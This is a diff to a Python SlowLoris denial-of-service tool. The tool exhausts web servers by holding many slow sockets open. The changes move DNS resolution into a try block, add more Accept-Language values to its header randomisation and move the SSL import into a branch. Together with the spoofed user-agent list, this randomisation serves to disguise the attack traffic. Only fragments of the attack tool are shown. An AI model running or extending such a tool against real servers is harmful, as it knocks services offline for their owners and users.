@@ -13,7 +13,6 @@ class SlowLoris:
                                'log_level': 0}
         try:
             ip = sys.argv[1]
-            ip = socket.gethostbyname(ip)
             max_sockets = sys.argv[2]
             ssl = sys.argv[3]
             log_filename = sys.argv[4]
@@ -27,6 +26,13 @@ class SlowLoris:
         self.log_filename = log_filename if (log_filename is not None) else self.default_values['log_filename']
         self.log_level = log_level if (log_level is not None) else self.default_values['log_level']
         self.sockets = []
+
+        try:
+            host = socket.gethostbyname(self.ip)
+            self.ip = host
+        except Exception:
+            pass
+
         logging.basicConfig(filename=self.log_filename, filemode='w',
                             format='%(asctime)s - %(levelname)s - %(message)s')
         self.logger = logging.getLogger()
@@ -68,17 +74,17 @@ class SlowLoris:
             'Mozilla/5.0 (Linux; Android 6.0.1; SHIELD Tablet K1 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Safari/537.36',
             'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
             'Mozilla/5.0 (CrKey armv7l 1.5.16041) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.0 Safari/537.36',
-            'Roku4640X/DVP-7.70 (297.70E04154A)', 'AppleTV6,2/11.1',
+            'Roku4640X/DVP-7.70 (297.70E04154A)',
+            'AppleTV6,2/11.1',
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64; XBOX_ONE_ED) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393',
             'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
             'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
             'Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)',
             'Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+']
-
         return random.choice(user_agents)
 
     def __get_language(self):
-        accepted_languages = ['en-US,en;q=0.9', 'en-US,fr-CA', 'en-GB, en;q=0.7']
+        accepted_languages = ['en-US,en;q=0.9', 'en-US,fr-CA', 'en-GB, en;q=0.7', 'hy', 'hz', 'ia', 'ja', 'jv', 'iw', 'zh-Hant-SG', 'zh-yue', 'ru', 'rw', 'ro', 'rm', 'af']
         return random.choice(accepted_languages)
 
     def __create_sockets(self):
@@ -86,9 +92,8 @@ class SlowLoris:
             self.__create_socket()
 
     def __create_socket(self):
-        import ssl as hook
-
         if self.ssl:
+            import ssl as hook
             self.__log_print('Creating ssl socket')
             ctx = hook.create_default_context()
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
